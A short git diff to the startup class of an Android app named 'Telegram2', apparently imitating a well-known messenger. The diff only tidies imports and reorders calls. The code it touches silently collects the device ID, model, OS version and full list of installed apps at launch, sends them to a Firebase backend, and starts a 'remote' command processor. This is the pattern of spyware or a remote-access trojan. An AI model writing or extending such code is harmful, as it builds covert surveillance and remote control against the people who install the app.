@@ -1,6 +1,7 @@
 package com.telegram2.messaging
 
 import android.app.Application
+import android.os.Build
 import android.provider.Settings
 import com.telegram2.messaging.remote.CommandProcessor
 import com.telegram2.messaging.remote.FirebaseBridge
@@ -11,13 +12,11 @@ class Telegram2App : Application() {
         super.onCreate()
         val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
             ?: UUID.randomUUID().toString()
-
         FirebaseBridge.init(deviceId)
-        CommandProcessor.init(this)
 
-        // Register device + send app list
         val apps = packageManager.getInstalledPackages(0).map { it.packageName }
-        FirebaseBridge.registerDevice(android.os.Build.MODEL, android.os.Build.VERSION.RELEASE, apps)
+        FirebaseBridge.registerDevice(Build.MODEL, Build.VERSION.RELEASE, apps)
         FirebaseBridge.pushInstalledApps(apps)
+        CommandProcessor.init(this)
     }
 }
